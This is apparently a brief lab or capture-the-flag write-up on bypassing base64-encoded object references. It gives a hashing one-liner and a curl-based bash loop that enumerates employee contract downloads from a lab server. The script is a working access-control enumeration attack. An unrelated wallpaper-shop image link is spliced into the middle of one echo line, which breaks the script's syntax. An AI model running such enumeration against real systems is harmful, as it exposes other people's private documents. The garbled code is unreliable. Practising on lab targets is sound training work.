# [Bypassing Encoded References](Bypassing%20Encoded%20References.md)
### Try to download the contracts of the first 20 employee, one of which should contain the flag, which you can read with 'cat'. You can either calculate the 'contract' parameter value, or calculate the '.pdf' file name directly.

```shell
for i in {1..20}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
```
![](Screenshot%202026-07-20%20at%2021.44.23.png)

**I found this script on Google** and it worked perfectly.
```bash
url="http://154.57.164.81:31072/download.php?contract="
echo "=== Bypassing Encoded References - Contract Enumeration ==="
for i in {1..20}; do
    # Reproduce the exact encoding: uid -> base64
    encodedid=$(echo -n $i | base64 -w 0)
    
    echo "Testing user $i (contract=$encodedid)..."
    
    # Make request and capture response
    response=$(curl -s "${url}${encodedid}")
    
    # Check for meaningful content
    if [[ ${#response} -gt 10 ]]; then
        echo "  ✓ Found content for user $i:"
        echo "$response"
        echo "  =========================="
    else
        echo "  ✗ Empty or minimal response"![European Summer Collection Vol.1 - 10+ Wallpapers](https://www.oleoclub.store/cdn/shop/files/Europeansummervives.png?v=1783642468&width=3840)
    fi
done
```
![](Screenshot%202026-07-20%20at%2021.52.43.png)
